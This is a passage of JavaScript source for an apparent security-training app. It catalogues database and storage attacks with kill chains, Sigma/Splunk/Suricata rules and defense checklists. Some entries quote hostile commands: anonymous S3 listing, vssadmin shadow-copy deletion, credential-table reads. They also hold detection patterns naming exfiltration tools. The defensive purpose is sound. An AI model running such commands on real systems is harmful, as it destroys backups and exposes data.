    summary: "Database Enumeration is the systematic probing and mapping of database architecture, database version, instance name, active user accounts, password hashes, table schemas, stored procedures, and trust relationships. Attackers query system catalogs (such as information_schema.tables, sys.databases, all_tables) or invoke database fingerprinters to establish high-value targets for exfiltration or privilege escalation.",
    killChain: [
      {
        step: 1,
        title: "DBMS Version & Environment Fingerprinting",
        mitre: "T1082",
        desc: "Querying database metadata functions (VERSION(), @@VERSION, user(), current_database()) to identify DBMS flavor and patch level."
      },
      {
        step: 2,
        title: "Catalog Schema & Table Harvesting",
        mitre: "T1083",
        desc: "Querying information_schema.tables, information_schema.columns, or sys.tables to discover sensitive tables (users, payments, passwords)."
      },
      {
        step: 3,
        title: "User Account & Privilege Mapping",
        mitre: "T1087.002",
        desc: "Extracting database user tables (mysql.user, pg_shadow, sys.sql_logins) to harvest password hashes and map DBA privileges."
      }
    ],
    telemetry: {
      sources: [
        "Database Query Logs (Audit of queries touching information_schema or sys.tables)",
        "Database Performance Logs (High rate of catalog table access)",
        "WAF Telemetry (Requests containing catalog keywords)"
      ],
      anomalies: [
        "Application database user querying information_schema.tables or sys.schemas",
        "High volume of queries extracting column names from information_schema.columns",
        "Queries attempting to access mysql.user, pg_shadow, or sys.sql_logins tables"
      ]
    },
    rules: {
      sigma: `title: Database Schema Enumeration via Information Schema Query
id: e2f3a4b5-c6d7-8e9f-0a1b-2c3d4e5f6a7b
status: production
description: Detects queries targeting database metadata catalogs to map tables, columns, and user permissions.
logsource:
    category: database
detection:
    selection:
        query|contains:
            - 'information_schema.tables'
            - 'information_schema.columns'
            - 'sys.databases'
            - 'pg_catalog.pg_tables'
            - 'all_tables'
    condition: selection
level: medium
tags:
    - attack.discovery
    - attack.t1083`,
      splunk: `index=db_audit (query="*information_schema.tables*" OR query="*sys.tables*" OR query="*pg_shadow*")
| stats count by user, client_ip, query
| eval Alert="MEDIUM: Database Schema & Metadata Enumeration Activity"
| table _time, user, client_ip, count, query, Alert`,
      suricata: `alert tcp any any -> $DB_SERVERS [1433,3306,5432] (
    msg:"SEC-ALERT Inbound Database Schema Enumeration Query";
    flow:to_server,established;
    content:"information_schema"; nocase;
    classtype:attempted-recon;
    sid:1000105;
    rev:1;
)`,
      sysmon: `# Verify application user cannot access system catalogs:
psql -U app_user -d production -c "SELECT * FROM pg_shadow;"`
    },
    defenseChecklist: [
      { id: "den_1", title: "Revoke Access to System Catalogs & Information Schema", tier: "Database Permissions", desc: "Revoke read permissions on information_schema, sys, and pg_catalog views from standard application users." },
      { id: "den_2", title: "Dedicated Restricted Database Users per Service", tier: "Architecture", desc: "Ensure each microservice connects using a dedicated database user restricted strictly to its own single schema namespace." },
      { id: "den_3", title: "Mask Database Errors & Version Banners", tier: "DBMS Config", desc: "Disable banner broadcasting on database listening ports and configure application drivers to hide database dialect details." },
      { id: "den_4", title: "Alert on Catalog Query Telemetry in SIEM", tier: "Monitoring", desc: "Program real-time SIEM alerts to notify the SOC immediately if any non-DBA account queries metadata tables." }
    ]
  },

  // =========================================================================
  // MODULE 19: STORAGE SECURITY ATTACKS (106 - 110)
  // =========================================================================
  {
    num: 106,
    id: "data-leakage",
    name: "Data Leakage",
    shortName: "Data Leakage",
    moduleGroup: "storage",
    module: "Storage Security Attacks",
    category: "storage",
    severity: "high",
    cvss: "8.2",
    mitre: "T1552, T1592.002",
    primaryTargets: "Public Cloud Buckets, Unprotected Storage Shares, Debug Logs, Temporary Dumps, Backup Volumes",
    threatActors: "Data Brokers, Competitive Intelligence Firms, Opportunistic Scrapers",
    summary: "Data Leakage (also known as Data Spill or Exposure) refers to the unauthorized transmission or passive exposure of confidential, proprietary, or regulated data (PII, PHI, financial records, API keys) from within an organization to an external destination or unintended recipient. Common vectors include misconfigured AWS S3 buckets with 'AllUsers' read permissions, storage snapshots shared publicly, and sensitive data written to publicly viewable debug logs.",
    killChain: [
      {
        step: 1,
        title: "Public Storage & S3 Bucket Discovery",
        mitre: "T1592.002",
        desc: "Using automated tools (S3Scanner, GrayhatWarfare) to enumerate publicly accessible S3 buckets and Azure blobs matching company naming conventions."
      },
      {
        step: 2,
        title: "Anonymous Object Enumeration",
        mitre: "T1083",
        desc: "Executing AWS CLI 'aws s3 ls s3://target-bucket --no-sign-request' to list folder structures and object keys without authentication."
      },
      {
        step: 3,
        title: "Bulk Sensitive Data Siphoning",
        mitre: "T1552",
        desc: "Downloading database SQL dumps, customer backups, internal PDFs, and private keys exposed in public storage."
      }
    ],
    telemetry: {
      sources: [
        "Cloud Storage Access Logs (AWS S3 server access logs, CloudTrail S3 Data Events)",
        "Cloud Security Posture Management (CSPM alerts on public bucket ACLs)",
        "Egress Firewall & Data Loss Prevention (DLP) telemetry"
      ],
      anomalies: [
        "Anonymous AWS S3 GetObject requests originating from unfamiliar external IP addresses",
        "Public bucket policies (Principal: *) applied to storage containers holding customer PII",
        "High volume of outbound data transfer from storage buckets occurring during off-hours"
      ]
    },
    rules: {
      sigma: `title: Public S3 Bucket Policy Applied Allowing Anonymous Read Access
id: f3a4b5c6-7d8e-9f0a-1b2c-3d4e5f6a7b8c
status: production
description: Detects AWS CloudTrail events where an S3 bucket policy is modified to allow public or unauthenticated access.
logsource:
    category: cloud
    product: aws
detection:
    selection:
        eventName:
            - 'PutBucketPolicy'
            - 'PutBucketAcl'
        requestParameters|contains:
            - 'Principal": "*"'
            - 'AllUsers'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1552`,
      splunk: `index=aws_cloudtrail eventName IN ("PutBucketPolicy", "PutBucketAcl")
| search requestParameters="*AllUsers*" OR requestParameters="*\"Principal\":\"*\"*"
| eval Alert="CRITICAL: S3 Storage Container Made Publicly Accessible (Data Leakage Risk)"
| table _time, userIdentity.arn, requestParameters.bucketName, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
    msg:"SEC-ALERT Direct Download of Exposed Database SQL Backup File";
    flow:to_server,established;
    content:"GET"; http_method;
    content:".sql.gz"; http_uri;
    classtype:policy-violation;
    sid:1000106;
    rev:1;
)`,
      sysmon: `# Audit AWS S3 buckets for Public Access Block:
aws s3control get-public-access-block --account-id 123456789012`
    },
    defenseChecklist: [
      { id: "dlk_1", title: "Enforce Account-Level S3 Block Public Access", tier: "Cloud Governance", desc: "Enable AWS S3 Block Public Access at the organization root account level to prevent any bucket from ever being made public." },
      { id: "dlk_2", title: "Automated Data Classification & Cloud DLP", tier: "Data Security", desc: "Deploy automated DLP scanners (Amazon Macie, Google Cloud DLP) to identify, tag, and alert on sensitive PII in storage repositories." },
      { id: "dlk_3", title: "Mandatory Server-Side Encryption with Customer Managed Keys", tier: "Storage Hardening", desc: "Enforce default AES-256 or KMS envelope encryption (SSE-KMS) on all storage buckets, rejecting unencrypted uploads via bucket policies." },
      { id: "dlk_4", title: "Automated CSPM Drift Detection & Auto-Remediation", tier: "DevSecOps", desc: "Use CSPM automation to immediately revoke public bucket ACLs and notify the SOC within 60 seconds of any configuration drift." }
    ]
  },
  {
    num: 107,
    id: "data-tampering",
    name: "Data Tampering",
    shortName: "Data Tampering",
    moduleGroup: "storage",
    module: "Storage Security Attacks",
    category: "storage",
    severity: "critical",
    cvss: "8.8",
    mitre: "T1565.001, T1565.002",
    primaryTargets: "SAN/NAS Storage Arrays, Audit Logs, Transaction Ledgers, Patient Health Records, Firmware Images",
    threatActors: "Financial Fraudsters, Nation-State Saboteurs, Disgruntled Insiders",
    summary: "Data Tampering is the deliberate, unauthorized modification, alteration, or corruption of data stored at rest or in transit, compromising data integrity. Threat actors alter banking transaction records, modify ledger balances, manipulate medical diagnostic outputs, flip bits in stored system binaries, or rewrite audit logs to cover their tracks. Without cryptographic hashing or immutable WORM storage, tampering may remain undetected indefinitely.",
    killChain: [
      {
        step: 1,
        title: "Privileged Storage Share Access",
        mitre: "T1078",
        desc: "Gaining administrative access to network file storage, database storage volumes, or cloud object repositories."
      },
      {
        step: 2,
        title: "Cryptographic Hash & Audit Bypass",
        mitre: "T1565.001",
        desc: "Overwriting target data records while recalculating or modifying corresponding checksums and log entries."
      },
      {
        step: 3,
        title: "Silent State Manipulation / Fraud",
        mitre: "T1565.002",
        desc: "Altering medical prescription dosages, diverting wire routing accounts, or replacing software update binaries with trojans."
      }
    ],
    telemetry: {
      sources: [
        "File Integrity Monitoring (FIM) Logs (Tripwire, OSSEC, Wazuh file hash delta logs)",
        "Storage Array Audit Logs (NetApp, Dell EMC, Pure Storage object modification telemetry)",
        "Database Transaction Log Audits (Change Data Capture / CDC logs)"
      ],
      anomalies: [
        "FIM alerts detecting unexpected SHA-256 hash modifications on critical system or ledger files",
        "Direct block-level modification of database storage volume files (.mdf, .ibd) bypassing DBMS engine",
        "Out-of-order sequence numbering or timestamps in transactional data stores"
      ]
    },
    rules: {
      sigma: `title: Critical System File Hash Mismatch Detected via FIM
id: a4b5c6d7-8e9f-0a1b-2c3d-4e5f6a7b8c9d
status: production
description: Detects File Integrity Monitoring alerts indicating unauthorized content modification on critical system binaries.
logsource:
    category: file_integrity
detection:
    selection:
        event_type: 'modified'
        file_path|startswith:
            - '/etc/'
            - '/bin/'
            - '/usr/bin/'
            - 'C:\Windows\System32\'
    condition: selection
level: critical
tags:
    - attack.impact
    - attack.t1565.001`,
      splunk: `index=fim_alerts action="file_modified" file_path IN ("*hosts*", "*passwd*", "*shadow*", "*.dll", "*.exe")
| stats count by host, user, file_path, old_hash, new_hash
| eval Alert="CRITICAL: Unauthorized File Modification Detected by FIM (Data Tampering Risk)"
| table _time, host, user, file_path, old_hash, new_hash, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (
    msg:"SEC-ALERT Direct SMB Write Attempt to Critical System Volume Share";
    flow:to_server,established;
    content:"SMB";
    classtype:suspicious-filename-detect;
    sid:1000107;
    rev:1;
)`,
      sysmon: `# Verify file integrity monitoring status via AIDE / Wazuh:
aide --check`
    },
    defenseChecklist: [
      { id: "dtmp_1", title: "Enforce Immutable Write-Once-Read-Many (WORM) Storage", tier: "Storage Architecture", desc: "Deploy S3 Object Lock in Compliance Mode or NetApp SnapLock to guarantee stored records cannot be altered or overwritten by any user." },
      { id: "dtmp_2", title: "Real-Time File Integrity Monitoring (FIM)", tier: "Host Security", desc: "Deploy FIM agents (Wazuh, OSSEC) across all production hosts to detect and alert on any unauthorized file modifications in real time." },
      { id: "dtmp_3", title: "Cryptographic Data Signing & Merkle Trees", tier: "Application Architecture", desc: "Sign all critical database records and ledger entries using cryptographic digital signatures or tamper-evident Merkle hash trees." },
      { id: "dtmp_4", title: "Segregation of Duties for Storage Administration", tier: "Access Governance", desc: "Require dual-authorization (two-person rule) for any manual modifications to storage array LUNs, volumes, or snapshot policies." }
    ]
  },
  {
    num: 108,
    id: "unauthorized-data-access",
    name: "Unauthorized Data Access",
    shortName: "Unauthorized Data Access",
    moduleGroup: "storage",
    module: "Storage Security Attacks",
    category: "storage",
    severity: "critical",
    cvss: "9.1",
    mitre: "T1078, T1021.002, T1213",
    primaryTargets: "Network Attached Storage (NAS), SMB File Shares, Cloud Object Stores, Confidential Data Vaults",
    threatActors: "Ransomware Double-Extortionists, Corporate Spies, Rogue Contractors",
    summary: "Unauthorized Data Access occurs when individuals or processes access storage repositories, file servers, or database stores without proper authorization or by bypassing established access controls. This is facilitated by over-permissive ACLs ('Everyone: Full Control'), stolen storage access tokens (e.g. AWS STS credentials, Azure SAS tokens), or lack of network microsegmentation separating storage networks from user subnets.",
    killChain: [
      {
        step: 1,
        title: "Enterprise Share & Storage Discovery",
        mitre: "T1135",
        desc: "Scanning domain subnets using PowerView or Snaffler to discover open SMB shares, NFS exports, and cloud storage endpoints."
      },
      {
        step: 2,
        title: "Over-Permissive ACL Exploitation",
        mitre: "T1078",
        desc: "Mounting file shares using standard Domain User credentials to access folders containing executive salaries, M&A docs, and source code."
      },
      {
        step: 3,
        title: "Confidential Data Harvesting",
        mitre: "T1213",
        desc: "Accessing and reading thousands of sensitive documents without generating access control violations."
      }
    ],
    telemetry: {
      sources: [
        "Windows File Server Audit Logs (Event ID 4663 - An attempt was made to access an object)",
        "NFS / SMB Access Logs",
        "Storage Access Telemetry (Cloud IAM and blob access telemetry)"
      ],
      anomalies: [
        "Standard user account reading thousands of confidential files across diverse network shares in minutes",
        "Access to sensitive executive shares during non-business hours from anomalous workstations",
        "Use of automated file discovery tools (Snaffler, PowerView) generating bursts of share query events"
      ]
    },
    rules: {
      sigma: `title: High Volume File Read Activity Across Network Share
id: b5c6d7e8-9f0a-1b2c-3d4e-5f6a7b8c9d0e
status: production
description: Detects a single user account reading a massive number of files on a network share within a short timeframe.
logsource:
    category: file_event
    product: windows
detection:
    selection:
        EventID: 4663
        AccessMask: '0x1'
    timeframe: 5m
    condition: selection | count(ObjectName) by SubjectUserName > 200
level: high
tags:
    - attack.collection
    - attack.t1213`,
      splunk: `index=wineventlog EventCode=4663 AccessMask="0x1" ObjectName="*\\\\finance\\\\*" OR ObjectName="*\\\\legal\\\\*"
| stats count by SubjectUserName, WorkstationName, ObjectName
| where count > 50
| eval Alert="HIGH: Rapid Bulk Read of Confidential Share Objects (Unauthorized Access Indicator)"
| table _time, SubjectUserName, WorkstationName, count, Alert`,
      suricata: `alert tcp any any -> $SMB_SERVERS 445 (
    msg:"SEC-ALERT High Volume SMB Tree Connect to Multiple Shares";
    flow:to_server,established;
    content:"SMB";
    threshold: type both, track by_src, count 10, seconds 30;
    classtype:bad-unknown;
    sid:1000108;
    rev:1;
)`,
      sysmon: `# Audit Windows share permissions for 'Everyone' or 'Domain Users':
Get-SmbShareAccess -Name * | Where-Object {$_.AccountName -match "Everyone|Domain Users"}`
    },
    defenseChecklist: [
      { id: "uda_1", title: "Eliminate Over-Permissive Share ACLs (Audit with Snaffler)", tier: "Storage Access", desc: "Audit and purge 'Everyone' and 'Domain Users' read permissions from all corporate network shares; enforce strict least-privilege security groups." },
      { id: "uda_2", title: "Deploy User and Entity Behavior Analytics (UEBA)", tier: "Security Analytics", desc: "Deploy UEBA solutions to establish baseline file access patterns and automatically terminate sessions accessing anomalous volumes of files." },
      { id: "uda_3", title: "Strict Network Microsegmentation for Storage Interfaces", tier: "Network Architecture", desc: "Isolate SAN/NAS management and iSCSI/NFS storage networks behind dedicated firewalls, permitting connections only from authorized hypervisors." },
      { id: "uda_4", title: "Zero-Trust Data Access Controls with Just-in-Time Access", tier: "Identity Governance", desc: "Implement Just-In-Time (JIT) access requests requiring manager approval before granting access to confidential corporate file vaults." }
    ]
  },
  {
    num: 109,
    id: "data-exfiltration",
    name: "Data Exfiltration",
    shortName: "Data Exfiltration",
    moduleGroup: "storage",
    module: "Storage Security Attacks",
    category: "storage",
    severity: "critical",
    cvss: "9.4",
    mitre: "T1567, T1048, T1041",
    primaryTargets: "Enterprise Cloud Backups, Intellectual Property Repositories, Customer PII Databases, File Servers",
    threatActors: "LockBit, BlackCat/ALPHV, Cl0p (MOVEit exploiters), Espionage Units",
    summary: "Data Exfiltration is the unauthorized duplication, transfer, or retrieval of confidential data from a company's systems or storage volumes to an adversary-controlled external destination. Attackers stage files using compression and AES encryption (7-Zip, RAR), and transfer the data over encrypted C2 channels, DNS tunneling, or cloud storage synchronization utilities (Rclone, MegaSync, Dropbox, IPFS) to facilitate double-extortion ransomware schemes.",
    killChain: [
      {
        step: 1,
        title: "Data Staging & Encrypted Compression",
        mitre: "T1074.001",
        desc: "Aggregating targeted files into staging folders and compressing them with 7-Zip using AES-256 passwords."
      },
      {
        step: 2,
        title: "Exfiltration Tool Deployment (Rclone / Mega)",
        mitre: "T1567.002",
        desc: "Dropping cloud sync tools (rclone.exe, mega-cmd) configured with adversary cloud storage API tokens."
      },
      {
        step: 3,
        title: "High-Speed Encrypted Egress Transfer",
        mitre: "T1048",
        desc: "Siphoning hundreds of gigabytes over HTTPS to Mega.nz, Dropbox, or attacker-controlled WebDAV servers."
      }
    ],
    telemetry: {
      sources: [
        "Network Egress Firewall & NetFlow Telemetry (High-bandwidth outbound connections)",
        "Endpoint Process Execution Logs (Execution of 7z.exe, rclone.exe, megasync.exe)",
        "DNS Logs (High-frequency TXT query anomalies indicating DNS tunneling)"
      ],
      anomalies: [
        "Massive spike in outbound encrypted HTTPS bandwidth to consumer cloud storage domains (mega.nz, transfer.sh)",
        "Execution of rclone.exe with command-line arguments like 'copy --transfers=16'",
        "High volume of DNS requests containing base64 or hex encoded subdomains"
      ]
    },
    rules: {
      sigma: `title: Rclone Execution for High-Volume Cloud Data Exfiltration
id: c6d7e8f9-0a1b-2c3d-4e5f-6a7b8c9d0e1f
status: production
description: Detects command-line execution of Rclone commonly used by double-extortion ransomware gangs to exfiltrate data.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\rclone.exe'
            - '\mega-cmd.exe'
        CommandLine|contains:
            - 'copy '
            - 'sync '
            - '--config'
            - '--transfers'
    condition: selection
level: critical
tags:
    - attack.exfiltration
    - attack.t1567.002`,
      splunk: `index=network_firewall (dest_host="*mega.nz*" OR dest_host="*transfer.sh*" OR dest_host="*dropboxapi.com*") bytes_out > 500000000
| stats sum(bytes_out) as total_bytes by src_ip, dest_host
| eval total_MB=round(total_bytes/1024/1024, 2)
| eval Alert="CRITICAL: Large Volume Outbound Transfer to Cloud Storage (Potential Data Exfiltration)"
| table _time, src_ip, dest_host, total_MB, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (
    msg:"SEC-ALERT High-Volume Egress Burst to MEGA Cloud Storage";
    flow:to_server,established;
    tls.sni; content:"mega.nz";
    threshold: type both, track by_src, count 50, seconds 60;
    classtype:policy-violation;
    sid:1000109;
    rev:1;
)`,
      sysmon: `# Verify local firewall blocks unauthorized cloud storage destinations:
netsh advfirewall firewall show rule name="Block-Mega-Sync"`
    },
    defenseChecklist: [
      { id: "exf_1", title: "Block Unauthorized Cloud Storage Sync at Perimeter Proxy", tier: "Perimeter / Secure Web Gateway", desc: "Block access to consumer cloud storage domains (Mega, Dropbox, WeTransfer, Telegram API) at perimeter SWG firewalls." },
      { id: "exf_2", title: "EDR Blocklist for Exfiltration Binaries (Rclone, MegaCmd)", tier: "Endpoint Security", desc: "Blacklist and immediately terminate execution of unauthorized utilities (rclone.exe, mega-cmd.exe, plink.exe, ngrok) via EDR policies." },
      { id: "exf_3", title: "NetFlow Outbound Bandwidth Anomaly Detection", tier: "Network Monitoring", desc: "Configure NetFlow/Zeek anomaly thresholds to alert the SOC whenever internal hosts exceed 500MB of outbound traffic to unusual destinations." },
      { id: "exf_4", title: "DNS Tunneling Inspection & Deep Packet Filtering", tier: "DNS Security", desc: "Inspect DNS telemetry for high-entropy subdomains and block unauthorized external DNS resolvers to stop DNS exfiltration." }
    ]
  },
  {
    num: 110,
    id: "data-destruction",
    name: "Data Destruction",
    shortName: "Data Destruction",
    moduleGroup: "storage",
    module: "Storage Security Attacks",
    category: "storage",
    severity: "critical",
    cvss: "9.9",
    mitre: "T1485, T1490, T1561",
    primaryTargets: "Primary Storage Volumes, Volume Shadow Copies, Storage Snapshots, Hypervisor Datastores, Cloud Backups",
    threatActors: "Wiper Operators (HermeticWiper, CaddyWiper, Shamoon), Sandworm, Destructive Hacktivists",
    summary: "Data Destruction is the deliberate, irreversible rendering of data unreadable, unrecoverable, or permanently deleted. Unlike ransomware which offers a decryption key, wiper malware and destructive attackers overwrite disk Master Boot Records (MBR), overwrite files with random zeros/null bytes, purge cloud snapshots and storage bucket versioning, delete Active Directory catalogs, and zero-out SAN storage LUNs to inflict catastrophic operational downtime.",
    killChain: [
      {
        step: 1,
        title: "Backup & Recovery Mechanism Inhabitation",
        mitre: "T1490",
        desc: "Executing commands to delete volume shadow copies (vssadmin delete shadows /all /quiet), wipe backup catalogs, and disable recovery modes."
      },
      {
        step: 2,
        title: "Low-Level Raw Disk Access & Driver Loading",
        mitre: "T1068",
        desc: "Loading raw disk drivers or vulnerable signed drivers (BYOVD) to bypass OS file system locks and EDR kernel hooks."
      },
      {
        step: 3,
        title: "Irreversible Overwrite & System Brick",
        mitre: "T1561.002",
        desc: "Overwriting the Master Boot Record (MBR), wiping partition tables, and overwriting file contents with zero bytes before forcing a system crash."
      }
    ],
    telemetry: {
      sources: [
        "Endpoint Detection & Response (EDR raw disk write telemetry, Event ID 9 / 10)",
        "Windows Event Logs (System Event 7045 - Driver Installed, Security 4688 vssadmin)",
        "Storage Array Management Logs (Snapshot deletion and LUN unmapping logs)"
      ],
      anomalies: [
        "Rapid sequential deletion of all volume shadow copies via vssadmin.exe, wmic.exe, or bcdedit.exe",
        "Direct raw disk handle write operations (\\\\.\\PhysicalDrive0) initiated by non-system processes",
        "Bulk mass deletion of cloud storage snapshots or backup vaults within seconds"
      ]
    },
    rules: {
      sigma: `title: Mass Deletion of Volume Shadow Copies (Inhibit System Recovery)
id: d7e8f90a-1b2c-3d4e-5f6a-7b8c9d0e1f2a
status: production
description: Detects command-line execution targeting Volume Shadow Copies to prevent recovery prior to data destruction.
logsource:
    category: process_creation
    product: windows
detection:
    selection_vssadmin:
        Image|endswith: '\vssadmin.exe'
        CommandLine|contains|all:
            - 'delete'
            - 'shadows'
    selection_wmic:
        Image|endswith: '\wmic.exe'
        CommandLine|contains|all:
            - 'shadowcopy'
            - 'delete'
    condition: selection_vssadmin or selection_wmic
level: critical
tags:
    - attack.impact
    - attack.t1490`,
      splunk: `index=sysmon (Image="*\\\\vssadmin.exe" CommandLine="*delete shadows*") OR (Image="*\\\\bcdedit.exe" CommandLine="*recoveryenabled no*")
| eval Alert="CRITICAL: Inhibiting System Recovery - Preparation for Wiper / Ransomware Destruction"
| table _time, host, User, Image, CommandLine, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $STORAGE_SERVERS $SMB_PORTS (
    msg:"SEC-ALERT Wiper Malware Disk Overwrite Activity Indicator";
    flow:to_server,established;
    content:"\\\\.\\PhysicalDrive"; nocase;
    classtype:successful-recon-limited;
    sid:1000110;
    rev:1;
)`,
      sysmon: `# Verify Volume Shadow Copies exist:
vssadmin list shadows`
    },
    defenseChecklist: [
      { id: "dest_1", title: "Air-Gapped Immutable Offline Backup Vaults", tier: "Business Continuity", desc: "Maintain air-gapped, offline, or cloud-isolated immutable backups that cannot be modified or deleted via network APIs." },
      { id: "dest_2", title: "Block Raw Disk Access via EDR & Attack Surface Reduction (ASR)", tier: "Host Hardening", desc: "Enable Windows Defender ASR rule 'Block untrusted processes from writing to raw disk sectors' to prevent MBR/GPT wiping." },
      { id: "dest_3", title: "Multi-Party Authorization for Snapshot Deletion", tier: "Cloud / Storage", desc: "Require Multi-Party Quorum Approval (M-of-N authorization) and 30-day retention lock before storage snapshots can be pruned." },
      { id: "dest_4", title: "Automated Instant Killswitch on Backup Tampering", tier: "SOC Automation", desc: "Configure SIEM to trigger an automated network isolation killswitch on any host executing vssadmin delete shadows." }
    ]
  }
];

// Application State
let currentAttackId = "dos";
let currentTab = "anatomy";
let currentRuleFormat = "sigma";
let currentFilter = "all";
let searchQuery = "";

// Storage for Defense Checklist
const CHECKLIST_STORAGE_KEY = "cyber_attack_book_readiness_v3";

function getCompletedChecklist() {
  try {
    const data = localStorage.getItem(CHECKLIST_STORAGE_KEY);
    return data ? JSON.parse(data) : {};
  } catch (e) {
    return {};
  }
}

function saveCompletedChecklist(data) {
  try {
    localStorage.setItem(CHECKLIST_STORAGE_KEY, JSON.stringify(data));
  } catch (e) {
    console.error("Failed to persist checklist state", e);
  }
}

// DOM Initialization
document.addEventListener("DOMContentLoaded", () => {
  parseInitialUrlState();
  updateHeaderMetrics();
  initSearchAndFilters();
  initTabNavigation();
  renderSidebarList();
  loadAttack(currentAttackId);
  updateGlobalReadiness();
  initHashRouting();
});

function parseInitialUrlState() {
  const rawHash = window.location.hash.replace("#", "");
  if (rawHash) {
    const parts = rawHash.split("?");
    const attackId = parts[0];
    if (ATTACKS_DATA.some(a => a.id === attackId)) {
      currentAttackId = attackId;
    }
    if (parts.length > 1) {
      const params = new URLSearchParams(parts[1]);
      if (params.get("tab") && ["anatomy", "detection", "defense"].includes(params.get("tab"))) {
        currentTab = params.get("tab");
      }
      if (params.get("filter")) {
        currentFilter = params.get("filter");
      }
    }
  }
}

function initHashRouting() {
  window.addEventListener("hashchange", () => {
    parseInitialUrlState();
    // Update filter pills UI
    document.querySelectorAll(".filter-pill").forEach(p => {
      p.classList.toggle("active", p.getAttribute("data-filter") === currentFilter);
    });
    // Update tab buttons UI
    document.querySelectorAll(".tab-btn").forEach(b => {
      b.classList.toggle("active", b.getAttribute("data-tab") === currentTab);
    });
    document.querySelectorAll(".tab-panel").forEach(p => {
      p.classList.toggle("active", p.id === `tab-${currentTab}`);
    });
    renderSidebarList();
    loadAttack(currentAttackId);
  });
}

function updateHeaderMetrics() {
  const totalCountEl = document.getElementById("total-attacks-count");
  if (totalCountEl) {
    totalCountEl.textContent = ATTACKS_DATA.length;
  }
}

function initSearchAndFilters() {
  const searchInput = document.getElementById("search-input");
  const clearBtn = document.getElementById("clear-search-btn");
  const topSearchInput = document.getElementById("top-search-input");
  const topClearBtn = document.getElementById("top-clear-search-btn");
  const filterPills = document.querySelectorAll(".filter-pill");

  // Sync initial active filter pill
  filterPills.forEach(p => {
    p.classList.toggle("active", p.getAttribute("data-filter") === currentFilter);
  });

  function applySearch(query, originInput) {
    searchQuery = query.trim().toLowerCase();
    
    // Sync both inputs
    if (searchInput && originInput !== searchInput) searchInput.value = query;
    if (topSearchInput && originInput !== topSearchInput) topSearchInput.value = query;

    if (clearBtn) clearBtn.style.display = searchQuery.length > 0 ? "block" : "none";
    if (topClearBtn) topClearBtn.style.display = searchQuery.length > 0 ? "block" : "none";

    // If typing in top search bar while in assessment or glossary mode, switch to learning mode
    if (originInput === topSearchInput && searchQuery.length > 0) {
      const learningLayout = document.getElementById("learning-layout");
      if (learningLayout && learningLayout.style.display === "none") {
        if (typeof switchAppMode === "function") {
          switchAppMode("learning");
        }
      }
    }

    renderSidebarList();
  }

  if (searchInput) {
    searchInput.addEventListener("input", (e) => applySearch(e.target.value, searchInput));
  }

  if (topSearchInput) {
    topSearchInput.addEventListener("input", (e) => applySearch(e.target.value, topSearchInput));
  }

  if (clearBtn) {
    clearBtn.addEventListener("click", () => {
      applySearch("", null);
      if (searchInput) searchInput.focus();
    });
  }

  if (topClearBtn) {
    topClearBtn.addEventListener("click", () => {
      applySearch("", null);
      if (topSearchInput) topSearchInput.focus();
    });
  }

  // Keyboard shortcut: '/' focuses the top search bar
  document.addEventListener("keydown", (e) => {
    if (e.key === "/" && !["INPUT", "TEXTAREA"].includes(document.activeElement.tagName)) {
      e.preventDefault();
      if (topSearchInput) {
        topSearchInput.focus();
        topSearchInput.select();
      }
    }
  });

  filterPills.forEach(pill => {
    pill.addEventListener("click", () => {
      filterPills.forEach(p => p.classList.remove("active"));
      pill.classList.add("active");
      currentFilter = pill.getAttribute("data-filter");
      renderSidebarList();

      const currentStillMatches = ATTACKS_DATA.some(item => {
        const matchesFilter = currentFilter === "all" || 
          item.moduleGroup === currentFilter || 
          item.category === currentFilter;
        return matchesFilter && item.id === currentAttackId;
      });

      if (!currentStillMatches) {
        const firstMatch = ATTACKS_DATA.find(item => 
          currentFilter === "all" || 
          item.moduleGroup === currentFilter || 
          item.category === currentFilter
        );
        if (firstMatch) {
          currentAttackId = firstMatch.id;
          loadAttack(firstMatch.id);
        }
      }

      window.location.hash = `${currentAttackId}?tab=${currentTab}&filter=${currentFilter}`;
    });
  });
}

function initTabNavigation() {
  const tabButtons = document.querySelectorAll(".tab-btn");
  
  // Sync initial active tab
  tabButtons.forEach(b => {
    b.classList.toggle("active", b.getAttribute("data-tab") === currentTab);
  });
  document.querySelectorAll(".tab-panel").forEach(p => {
    p.classList.toggle("active", p.id === `tab-${currentTab}`);
  });

  tabButtons.forEach(btn => {
    btn.addEventListener("click", () => {
      tabButtons.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      currentTab = btn.getAttribute("data-tab");
      window.location.hash = `${currentAttackId}?tab=${currentTab}&filter=${currentFilter}`;

      document.querySelectorAll(".tab-panel").forEach(p => p.classList.remove("active"));
      const targetPanel = document.getElementById(`tab-${currentTab}`);
      if (targetPanel) {
        targetPanel.classList.add("active");
      }
    });
  });
}

function renderSidebarList() {
  const listContainer = document.getElementById("attack-list");
  listContainer.innerHTML = "";

  const filteredAttacks = ATTACKS_DATA.filter(item => {
    const matchesFilter = currentFilter === "all" || 
      item.moduleGroup === currentFilter || 
      item.category === currentFilter;
    const matchesSearch = searchQuery === "" || 
      item.name.toLowerCase().includes(searchQuery) ||
      item.shortName.toLowerCase().includes(searchQuery) ||
      item.mitre.toLowerCase().includes(searchQuery) ||
      item.primaryTargets.toLowerCase().includes(searchQuery) ||
      item.threatActors.toLowerCase().includes(searchQuery) ||
      item.summary.toLowerCase().includes(searchQuery) ||
      item.module.toLowerCase().includes(searchQuery) ||
      String(item.num).includes(searchQuery);
    return matchesFilter && matchesSearch;
  });

  if (filteredAttacks.length === 0) {
    listContainer.innerHTML = `
      <div style="padding: 24px; text-align: center; color: var(--text-muted); font-size: 0.85rem;">
        No attacks match your filter or search query.
      </div>
    `;
    return;
  }

  filteredAttacks.forEach((attack) => {
    const numStr = attack.num < 10 ? `0${attack.num}` : `${attack.num}`;

    const card = document.createElement("div");
    card.className = `attack-card-nav ${attack.id === currentAttackId ? 'active' : ''}`;
    card.setAttribute("tabindex", "0");
    card.setAttribute("role", "button");
    card.setAttribute("data-id", attack.id);
    card.setAttribute("aria-label", `Select Attack ${numStr}: ${attack.name}`);

    card.innerHTML = `
      <div class="attack-card-meta">
        <span class="attack-number">ATTACK ${numStr}</span>
